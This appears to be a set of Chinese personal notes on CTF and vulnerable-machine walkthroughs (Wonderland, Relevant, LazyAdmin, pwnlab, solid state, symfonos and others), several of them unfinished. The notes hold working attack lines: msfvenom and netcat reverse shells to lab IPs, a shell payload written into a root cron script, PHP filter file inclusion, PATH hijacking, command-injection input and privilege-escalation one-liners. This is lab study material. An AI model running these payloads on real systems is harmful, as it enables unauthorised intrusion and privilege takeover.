
# Wonderland
## nmap加字典爆破

发现有很多陷阱的文件路径 访问进去基本都是404 

有个图片的网站 有一个纯文本的网页

```
/img
/r
/poem
```

有意思的一点是 还不够纵深 用feroxbuster 来深入扫描

好家伙 /r一直到拼出rabbit 看源码就知道有个东西被隐藏了 好家伙 是个账户密码 后知后觉

![image.png](https://s2.loli.net/2025/04/22/Le8ZC16sOxPq4Dk.png)

## ssh连接
```
alice：HowDothTheLittleCrocodileImproveHisShiningTail
```
用这个成功登录进去了

## user root
根据提示说是相反的  说明user可能在root那里 进root cat一下有了

## rabbit python劫持
这里使用的是random的python库 创建一个random的py文件  运行就OK了

```
import pty
pty.spawn("/bin/bash")
```

```
sudo -u 用户名
```
![image.png](https://s2.loli.net/2025/04/22/LJAcFR75dZeCbf8.png)

![image.png](https://s2.loli.net/2025/04/22/s2g7w9vYuRfPaQb.png)

成功切换用户

## 缓冲区溢出的漏洞


# morphes

首先第一步就是信息收集 一开始就用了dirb和dirsearch去扫描 结果都没什么收获 又用了gobuster去跑了个大型字典 跑出了两个还不错的东西

```
gobuster dir -u http://61.139.2.145/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

[[tryhackme-Gobuster：基础知识#task4]]

![image.png](https://s2.loli.net/2025/04/11/IjQu46fvsnwgc2G.png)

![image.png](https://s2.loli.net/2025/04/11/dFaQSluzVtqfeDb.png)


发现到的东西目前是这样 

## 访问php

发现是一个输入的界面输入完东西会存在上面 我怀疑是存储型xss 试了一下最简单的没用 用了双写和大写过滤 成功插入

# Relevant（完）
## 信息收集
nmap和fscan扫描 发现有smb 其实之前是不知道smb怎么登陆的 错失了一部分信息

### smbclient枚举
```
smbclient -L 10.10.169.39

smbclient //10.10.169.39/nt4wrksv
```

![image.png](https://s2.loli.net/2025/04/26/jVcNAobux4aRYlX.png)


![image.png](https://s2.loli.net/2025/04/26/1B2oTzt6XbeIRcU.png)


### nmap脚本扫描
```
nmap --script smb-enum-shares --script-args smbuser=user,smbpass=pass 10.10.56.50

调用 Nmap 的 ​**​`smb-enum-shares.nse`​**​ 脚本

向脚本传递身份认证参数，用于连接需要用户验证的 SMB 服务
```
![image.png](https://s2.loli.net/2025/04/26/2aWyrUYlBhJ589x.png)

在网上找到的脚本参数 来枚举出smb的文件

## 账户密码
在里面找到一个password.txt 

get 文件名下载到本地

![image.png](https://s2.loli.net/2025/04/20/hXO8FNGjHVafse2.png)

![image.png](https://s2.loli.net/2025/04/20/PUSc9nO71GvB8Wf.png)

## 尝试远程连接
无果 发现还是反弹shell

## msf反弹shell
编写的shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.40.203 LPORT=8888 -f aspx -o shell3.aspx

有个要注意的就是 浏览器访问需要加个49663端口
```

![image.png](https://s2.loli.net/2025/04/26/QJ6raP13bfm7gzR.png)

查看一下可用权限

```
whoami /priv
```

![image.png](https://s2.loli.net/2025/04/26/obGv72iT6SOJRAV.png)

## 提权
滥用 SeImpersonatePrivilege 使用PrintSpoofer64.exe提权
```
dir /s /b c:\ | find "PrintSpoofer64.exe"
cd c:\inetpub\wwwroot\nt4wrksv\
PrintSpoofer64.exe -i -c cmd

```

成功提权
# devguru
## nmap 加dirb文件爆破
![image.png](https://s2.loli.net/2025/04/28/bBu8MXowxeAkmWl.png)

发现有个.git文件 就可以试试git源码泄露

## git泄漏源码
使用git-dumper工具提取出源码
![image.png](https://s2.loli.net/2025/04/29/7aqPiZof5uWjBzD.png)

## 信息收集
在源码中我们发现有个数据库的配置文件

![image.png](https://s2.loli.net/2025/04/29/2Xqf8VBh7QALsYu.png)

尝试登录mysql看看 
![image.png](https://s2.loli.net/2025/04/29/JB1ZDh64utRPNp3.png)

成功登录进去了
![image.png](https://s2.loli.net/2025/04/29/PQUrNJyuIcinH73.png)

一番查找找到了用户和密码
![image.png](https://s2.loli.net/2025/04/29/9idVJDxefc7EhU4.png)

### 密码破解
用hash-identifier识别 但没发现任何东西 八层是破解不了了

### 第二招 更新或添加用户密码
这里选择添加新用户 密码使用[hash]([Bcrypt Generator - Online Hash Generator and Checker](https://bcrypt-generator.com/))进行加密
![image.png](https://s2.loli.net/2025/04/29/RcnJjLBWTYg2k9d.png)

![image.png](https://s2.loli.net/2025/04/29/rMigIwXp98cBhTz.png)

记得设置好group数

## 登录另一个网站
![image.png](https://s2.loli.net/2025/04/29/QzGq2vhI6uZ958o.png)

在这里发现了一个登录的页面 刚刚的密码应该就是在刚刚修改的mysql数据库中

用新添加的用户登录一下

成功登录
# LazyAdmin(完)
[[LazyAdmin]]
## nmap和字典爆破
扫描出来 一个登录页面 一个网站首页
![image.png](https://s2.loli.net/2025/05/05/NlnPGSbp61LjJoI.png)

## 信息收集 
也知道是sweetrice的cms 但查不到版本 登录页面也没有什么重要信息

## 查找能利用的漏洞

找到一个漏洞可以查看到数据库的漏洞

```
SweetRice 1.5.1 - Backup Disclosure

http://localhost/inc/mysql_backup
```

![image.png](https://s2.loli.net/2025/04/24/K7CQzYnUmJF9T4q.png)

在我们找到的/content中 在sql文件中找到了账户和密码 密码得去(解密)[https://crackstation.net/]一下

![image.png](https://s2.loli.net/2025/05/05/357twrl1YvVJdoi.png)


## 依旧信息收集

媒体中心有上传文件的地方 直接上传反弹shell 但php传不进去 只能改格式

![image.png](https://s2.loli.net/2025/05/05/MD7bdpAzEY2oj5W.png)

![image.png](https://s2.loli.net/2025/05/05/G8euDsr21XbwHnx.png)

## 提权
发现文件夹有个mysql的l登录文件 是账户和密码  登进去看看有什么信息吗

![image.png](https://s2.loli.net/2025/05/05/iCbVy5LqR1WnsYM.png)

无信息

![image.png](https://s2.loli.net/2025/05/05/yWqU5CP7znBxZl8.png)

发现一个脚本


那就想办法利用这个脚本

![image.png](https://s2.loli.net/2025/05/05/dyHFfrSEZlVtOa2.png)


弄巧成拙了 这样爆了参数问题的错

![image.png](https://s2.loli.net/2025/05/05/kNaXE85Wf2oIPTy.png)

就把原本的代码刚好就是反弹shell 把ip改成我们自己的就可以

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.40.203 6666 > /tmp/f" > /etc/copy.sh
```

![image.png](https://s2.loli.net/2025/05/05/dLJ9P2BqgWCEF7K.png)

![image.png](https://s2.loli.net/2025/05/05/Ulc7iQo3jmJxqOY.png)

但直接运行的话 反弹过来的不是root权限

用
```
 sudo /usr/bin/perl /home/itguy/backup.pl
```

反弹shell就能是root

![image.png](https://s2.loli.net/2025/05/05/Pw6opWYb29ndAx1.png)




# kio5
## 依然信息收集

nmap和dirb dirsearch扫描 都发现没有什么东西

端口就只有80端口和8080端口开放 8080端口又没有开放

目录爆破 很可惜 跑了大字典也没用 啥也没有

## 突发奇想 whatweb扫描

![image.png](https://s2.loli.net/2025/04/21/9ENcWfK2D3zqStZ.png)

发现有一个没有发现的路径 访问看看

![image.png](https://s2.loli.net/2025/04/21/aztm7RAnCw239od.png)

发现是个pchart2.1.3版本 我们搜搜有什么漏洞可以利用嘛 

## 漏洞利用
检测出了两个漏洞

![image.png](https://s2.loli.net/2025/04/21/TPA1ZCF6rb5kYtH.png)

我们用一下路径穿越漏洞 看一下还能访问别的目录名
![image.png](https://s2.loli.net/2025/04/21/kILqFYaS5ycfwGe.png)

![image.png](https://s2.loli.net/2025/04/21/yL8z9D3vIPmESuR.png)


其实在这里争了 半天 没好好看配置文件 配置文件中把user-agent改成Mozilla/4.0 Mozilla4_browser

bp抓包 改参数 放行就能进去了

![](https://s2.loli.net/2025/04/21/fKil9NZVCxeU6jb.png)


![image.png](https://s2.loli.net/2025/04/21/c1xmaUIJnjsP37y.png)

![image.png](https://s2.loli.net/2025/04/21/Rj5wigxomUfP9zE.png)



# rootme(完)
## nmap扫描端口
发现有一个隐藏端口

## 文件上传漏洞
重要地方 遇到文件上传多去文件路径找找/uploads这个路径

上传php被拦截了 得想办法绕过 因为是要找到路径执行我们的php反弹shell 所以我们要用php5绕过

反弹shell成功

## 继续提权

```
find / -user root -perm /4000
```
找到一个/bin/fusermount

## python提权
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```



# Pinkys-Palace2（缓冲区溢出）
## nmap扫描 目录爆破
上网站会发现是个wordpress的网站

## 网页信息收集


# pwnlab（完）
[[pwnlab]]
## nmap扫描和字典爆破
但也只有一两个文件路径 是个登录界面 看看有什么思路吗

## bp抓包sqlmap
无果

## bp爆破密码
无果

## nikto
新工具 扫出来一个config的目录 但登进去没什么卵用

## 思考
![image.png](https://s2.loli.net/2025/04/28/9fBeUyVA7vWuG25.png)

细看这个路径总感觉很怪  

```
？page=login 
总感觉可以试试文件包含之类的
```

好家伙  php伪协议

```
http://61.139.2.159/?page=php://filter/convert.base64-encode/resource=config
```

获得了base64的加密的配置文件 解码之后能得到mysql的账户密码

![image.png](https://s2.loli.net/2025/04/28/zrq2t56fLj7WKDV.png)

![image.png](https://s2.loli.net/2025/04/28/C76nKbdtQizApxZ.png)


## 登录mysql数据库
在扫描端口的时候发现了3306端口 连接看看

因为在这个机子中根本登录不进去mysql 只能用网上的图

![image.png](https://s2.loli.net/2025/05/12/RYzT4PhB781V2Cb.png)

## 文件上传
登录进去发现是文件上传 上传图片马发现没得路径访问 另请高明

抓包能看到路径

![image.png](https://s2.loli.net/2025/05/12/liVDAyMIZsbvemG.png)

## 无思路
看了一下index源码
![image.png](https://s2.loli.net/2025/05/12/RxMc5BzuwkWCVsi.png)

发现能利用一下这个
在cookie处增加lang=../文件路径 
![image.png](https://s2.loli.net/2025/05/12/soUkJzhQSeXYEnN.png)


![image.png](https://s2.loli.net/2025/05/12/fe4PlkgAEKcFUMd.png)

反弹shell成功
![image.png](https://s2.loli.net/2025/05/12/4fpeQVChynGscvw.png)

## 提权
登录到kane用户发现了一个文件
![image.png](https://s2.loli.net/2025/05/12/g2BvhfZwMFA5JIk.png)

这个文件有s权限 而且还有cat命令


## 环境变量劫持
```
echo '/bin/sh' > cat
chmod 777 cat
export PATH=./:$PATH
./msgmike
```
![image.png](https://s2.loli.net/2025/05/12/G3qUpM6stiYr5Nk.png)


在mike查看有个文件

![image.png](https://s2.loli.net/2025/05/12/a3uUzS81A6KNbZW.png)
## 使用分割符绕过并执行命令
```
11;/bin/sh;
```

![image.png](https://s2.loli.net/2025/05/12/yPZdC5TKGkE8OjJ.png)



![image.png](https://s2.loli.net/2025/05/12/hQGMrUjcT4pmdIE.png)

# solid state（完）
## nmap和目录爆破
有个很神奇的发现

![image.png](https://s2.loli.net/2025/04/30/2FpikjXSgJ6lNU9.png)

有个james 2.3.2 这是个关键点 在浏览器中能找到james 2.3.2的漏洞

是个弱口令登录 root:root

使用nc连接 就能连接进去

发现能找到很多用户 我们全部改成统一密码 

![image.png](https://s2.loli.net/2025/05/02/bncx85Gfq6JuF17.png)

## telnet
现在全部改完密码 挨个登录110端口检查有无重要信息

#注意 telnet的一些命令
```
user 用户名
pass 密码
list
retr 邮件名
```


![image.png](https://s2.loli.net/2025/05/02/KLvjbuFZD9ImrP1.png)


发现是mindy和john的对话 优先检查这两个邮件 获得了mindy的账户密码

用这个密码成功登录ssh

## ssh登录
发现是一个rbash 被限制了

## rbash逃逸
先看看环境变量
```
env
printenv
```

![image.png](https://s2.loli.net/2025/05/02/ROo78Zch3XrAL4G.png)

用不了

看到了ssh逃逸 但不会使用

看了wp发现原来还有这操作

```
ssh mindy@61.139.2.158  "export TERM=xterm;python -c  'import pty;pty.spawn(\"/bin/bash\")'"
```


![image.png](https://s2.loli.net/2025/05/02/MPd9foNm7zaBnUw.png)

## 逃逸成功 开始提权
还是有点依赖linpeas一点 方便查东西 

#注意 之后多一个搜索的地方 /opt

![image.png](https://s2.loli.net/2025/05/02/Jo5V6dXQCf1yPzs.png)

root权限的python脚本 我们改一下
```
echo 'import os; os.system("/bin/nc 61.139.2.153 8888 -e /bin/bash")' > /opt/tmp.py

反弹之后就是root
```
[[shell和提权#^abc63a]]
[[shell和提权#^5af79a]]


# Zeno
## nmap和字典扫描安排上
只发现了一个ssh端口 改进一下扫描命令

```
nmap -p- -sS --min-rate 5000 -n -Pn 10.10.178.46
```

![image.png](https://s2.loli.net/2025/05/03/yokrdizRF8CLA9I.png)

## 总算找到了
开始文件爆破

![image.png](https://s2.loli.net/2025/05/03/pTW4gKHaRYNqJcB.png)

进去看看 

有个登录界面和疑似sql注入的界面

发现疑似有个注入点 抓包看看
![image.png](https://s2.loli.net/2025/05/03/UFIzc9siRuGwOx5.png)


这个先挂着 再找找看还有别的吗

在这里输入‘试探一下居然会报错 应该是有这个可能了

![image.png](https://s2.loli.net/2025/05/03/NdVCzqly6uESBWb.png)


没戏

好家伙 这个居然是个可以搜索的

遇到这种带system的多留意一下
![image.png](https://s2.loli.net/2025/05/03/KgnhjF2suQbcX7A.png)


## 漏洞利用



# breach 1.0
## nmap扫描和字典爆破
![image.png](https://s2.loli.net/2025/05/04/FpY7ZXJjWL9hBiP.png)

这小子开了全端口

只能从最开始的80端口开始查看了

在发现源代码中有一个备注 解码之后发现是个账户密码

![image.png](https://s2.loli.net/2025/05/04/RVI3rp6fuPUFEaN.png)


![image.png](https://s2.loli.net/2025/05/04/J14rDZBUOGbXhcH.png)


## 无思路
太混乱了 但忘记一个东西"initech.html"  在源码中有个新的网站

![image.png](https://s2.loli.net/2025/05/05/l1m2HdvewPyB8Ga.png)

找到了 一个攻入点

![image.png](https://s2.loli.net/2025/05/05/xivaWs4Qc5bAGCl.png)

是个登录界面 好玩了

在邮件中逛的时候发现了ssl的证书

![image.png](https://s2.loli.net/2025/05/05/pEeYshrWCvPz2Ji.png)


ssl证书应该就是攻破点

![](https://s2.loli.net/2025/05/05/fx8QE6tTmKrVDCu.png)

在这里有个和ssl有关的

![image.png](https://s2.loli.net/2025/05/05/sxVe95I6jS2PGp3.png)

点进去发现是个流量包

全部密码都设置成了tomcat

```
keytool -list -keystore Untitled.keystore
是一个用于查看密钥库（KeyStore）内容的 Java 命令行工具指令。

keytool -importkeystore -srckeystore Untitled.keystore -destkeystore Untitled.keystore -deststoretype pkcs12 -srcalias tomcat

-srcalias tomcat
限定迁移操作的密钥条目别名（此处为 `tomcat`）
```

![image.png](https://s2.loli.net/2025/05/05/aerclu9FOf4IWCn.png)


![image.png](https://s2.loli.net/2025/05/05/BCE2TeYtMIxgdDH.png)

![image.png](https://s2.loli.net/2025/05/05/EcxgdjW3utXYopD.png)

配置一下tls 导入ssl证书 这里有个错误 不能用old 要用换来那个 old是备份

配置为就能看到详细的信息了

![image.png](https://s2.loli.net/2025/05/05/j4Rw7frmt9pDKq2.png)
 有点奇怪



# symfonos:5
## nmap 扫描端口
有个 80 端口，389 端口和 636 端口就不太熟悉了
![](https://s2.loli.net/2025/05/21/pmUPJz9EsVDv8Yu.png)


## web 服务枚举
发现有个 admin. php
![image.png](https://s2.loli.net/2025/05/21/SJoeFZ7aWgyKkTc.png)

![image.png](https://s2.loli.net/2025/05/22/7cupx3MP1b8VyGC.png)


一个登录界面

![image.png](https://s2.loli.net/2025/05/21/sq4iTfuyb7LGHUK.png)

但万能密码试了都没啥用。bp 抓包一下

![image.png](https://s2.loli.net/2025/05/22/BzTOr3E4JyXIwpg.png)

也对这两个参数进行 sql 模糊测试也是没用的结果

![image.png](https://s2.loli.net/2025/05/22/QU84Nh2q6EOV9ao.png)


就模糊测试一下. php 文件，有个发现/portraits. php
![image.png](https://s2.loli.net/2025/05/22/NYRxpJLhryEzISH.png)

进去但也没啥发现，就三张图
![image.png](https://s2.loli.net/2025/05/22/kweVKlItYrAuDGZ.png)


继续抓包测试。也是无

访问 home. php 会跳转，抓包看看。有个 url
![image.png](https://s2.loli.net/2025/05/22/hvsxXU9KjpmJngM.png)


## 重新整理思路
明明思路是没错的，也对 admin. php 界面进行 sql 的模糊测试。但没有出来。

从 ldap 下手吧
![image.png](https://s2.loli.net/2025/05/22/Pxnrva4peuBTHGt.png)

能枚举出信息

这里之后就断了、、 

刚刚发现 home. php 有个? url 的东西，可能是个文件包含之类的。但我们要利用这个需要登进 admin. php


# symfonos 6
## nmap 扫描端口
![image.png](https://s2.loli.net/2025/05/24/CEpGoBetryc8vJD.png)


![image.png](https://s2.loli.net/2025/05/24/KM7DqHEiwC1SrzO.png)



![image.png](https://s2.loli.net/2025/05/24/WXAS7J1PFZ8RGr9.png)

3000 和 5000 也疑似是 web 服务


## web 服务 80 端口
![image.png](https://s2.loli.net/2025/05/24/UVic79dnZvGtLol.png)

用 gobuster 扫描一下
![image.png](https://s2.loli.net/2025/05/24/HqtwZMmEC5vTLao.png)


![image.png](https://s2.loli.net/2025/05/24/CIhM36jgBR2yv4D.png)

看样子像一个系统


继续扫描这个路径的子目录。有个  Test 和 plugins 和 scripts 可以看看 
![image.png](https://s2.loli.net/2025/05/24/mMeP2jfSublrGA8.png)

在 tests 目录找到一些 php 文件，其他都是 404

![image.png](https://s2.loli.net/2025/05/24/EfWY43gKXUrpaBm.png)

php 里面并没有东西

这个是另外一个目录的内容

![image.png](https://s2.loli.net/2025/05/24/9248umMtfO1FNgU.png)

继续扫描子目录
![image.png](https://s2.loli.net/2025/05/24/RH8WtAugnrhDB2d.png)


![image.png](https://s2.loli.net/2025/05/24/No8JmfYvh4u5OAB.png)

里面文件依旧是打不开的

搜索一下漏洞
![image.png](https://s2.loli.net/2025/05/24/V6rzZeJM5tX1Bxp.png)

## 3000 端口的信息收集
是个 gitea 网站。估计有什么备份文件之类的
![image.png](https://s2.loli.net/2025/05/24/RAmWDEh9I3o57GO.png)

顺藤摸瓜找到两个用户
![image.png](https://s2.loli.net/2025/05/24/RXMzIwYCOfDdFbZ.png)

找到版本号
![image.png](https://s2.loli.net/2025/05/24/MG2mawOTubdQDBU.png)


也是能找到这个版本的漏洞的
![image.png](https://s2.loli.net/2025/05/24/xUtgYlmFwhVSCAy.png)


## 5000 端口的信息收集
![image.png](https://s2.loli.net/2025/05/24/b9SulwDpOgLah58.png)

这个 5000 端口就没有东西

![image.png](https://s2.loli.net/2025/05/24/6MafDYVuK5PRxtQ.png)


## 小总结 
已知 80 端口是个 flyspray 的系统，有登录界面。3000 端口是 gitea，知道版本号能找到漏洞，也有登录界面。5000 端口是 404
## 80 端口测试
随便输入用户名是出现这样的报错
![image.png](https://s2.loli.net/2025/05/24/kj2xY9V1A3pmDTB.png)


我们在登录页面输入 achilles 出现的是这样的报错
![image.png](https://s2.loli.net/2025/05/24/meBvnP7iURjISpg.png)

通过报错我们可以知道，有 achilles 这个用户存在

思路确实没毛病，但看漏了东西，没去看 docs 这个目录
![image.png](https://s2.loli.net/2025/05/24/9HJPR5zwVY2gMFo.png)


估摸着是 1.0 的版本
![image.png](https://s2.loli.net/2025/05/24/fHQYPCg5hXROz1W.png)

那就知道要用什么漏洞了

![image.png](https://s2.loli.net/2025/05/24/QUEed3yrtb89ADX.png)

## 3000 端口尝试
试了 hydra，并没有用。只能漏洞利用了。
![image.png](https://s2.loli.net/2025/05/24/GmClFwjhTv7Zep5.png)

我们使用第一个 poc

要利用这个 poc 需要我们获得 gitea 的账户密码

## 80 端口漏洞利用

⚠️upload failed, check dev console



![image.png](https://s2.loli.net/2025/05/24/KBa3usd2ChYg6Nl.png)

#  Digitalworld. Local (joy)（完）

## nmap 扫描端口
![](https://s2.loli.net/2025/05/25/g5Xf1FxOmnWHDcS.png)

有个匿名登录的 ftp
![image.png](https://s2.loli.net/2025/05/25/EJ6l758IdWQsSjt.png)


有 smb 服务
![image.png](https://s2.loli.net/2025/05/25/rk8BGfHF6o3SdI1.png)


ftp 服务里面的文件
![image.png](https://s2.loli.net/2025/05/25/cmAaUDod5ug2SXv.png)

只能说很多文件，但目前没什么头绪，可能 upload 是我们需要利用的

## 80 端口的收集
![image.png](https://s2.loli.net/2025/05/26/GoiPJEnUgYj7wsx.png)

发现有很多的信息
![image.png](https://s2.loli.net/2025/05/26/2Zn8S7kgtBde5Iz.png)


## ftp 服务信息收集
我们把 ftp 的信息把东西下载到本机。一个一个检查
![image.png](https://s2.loli.net/2025/05/26/2amYZSXbIhEodOs.png)
都是 Patrick 的文件夹，但是不知道在哪里

![image.png](https://s2.loli.net/2025/05/26/A2V19e6NyrfGPhI.png)

![image.png](https://s2.loli.net/2025/05/26/9FJnWu54y3cMdoP.png)

发现了很多的 txt

mget *之后会发现，有一个 zip 的压缩包。应该是 ftp 里面下载的

![image.png](https://s2.loli.net/2025/05/26/VrqPbs8LQG7Bemo.png)


压缩包需要密码，我们只能慢慢找, 没啥线索

## 转战 udp
```
nmap -sU -Pn -A --top-ports 20 192.168.235.133
```
![image.png](https://s2.loli.net/2025/05/26/51gxP369VGUh8qw.png)

有个 snmp 和 tftp 服务

![](https://s2.loli.net/2025/05/26/hg2kWHX9VTlP1nC.png)

看到 smb 服务泄露了一个 tftp 端口的信息

看了 wp 发现，刚刚找到的文件就在这个 tftp 中。

![image.png](https://s2.loli.net/2025/05/26/dJoF2vAHbk8G3BI.png)


![image.png](https://s2.loli.net/2025/05/26/ZX1fC4vHi7nWYFN.png)


找到基本的版本信息
![image.png](https://s2.loli.net/2025/05/26/THjoV6mlKDXEeRz.png)

##  新

### ftp 匿名登录
![image.png](https://s2.loli.net/2025/06/04/gnmzJPilMvCqNXw.png)

### 漏洞利用

![image.png](https://s2.loli.net/2025/06/04/I8FQkNejat9YbiP.png)

![image.png](https://s2.loli.net/2025/06/04/iVYyLIxatFTQDAE.png)


![image.png](https://s2.loli.net/2025/06/04/uJoArFcm4UTNGMe.png)

## 信息收集
![image.png](https://s2.loli.net/2025/06/04/4Rvj9r3KwCQWghM.png)

找到个密码

切换用户
![image.png](https://s2.loli.net/2025/06/04/JzrL4579g3SfhtK.png)

![image.png](https://s2.loli.net/2025/06/04/yCuAM91sZgTXxqo.png)

运行程序，发现是个覆写的程序，将 etc/passwd 权限改成 7777，添加一个 root 权限用户。完成提权

![image.png](https://s2.loli.net/2025/06/04/1DAjmCW8PSyuXZt.png)
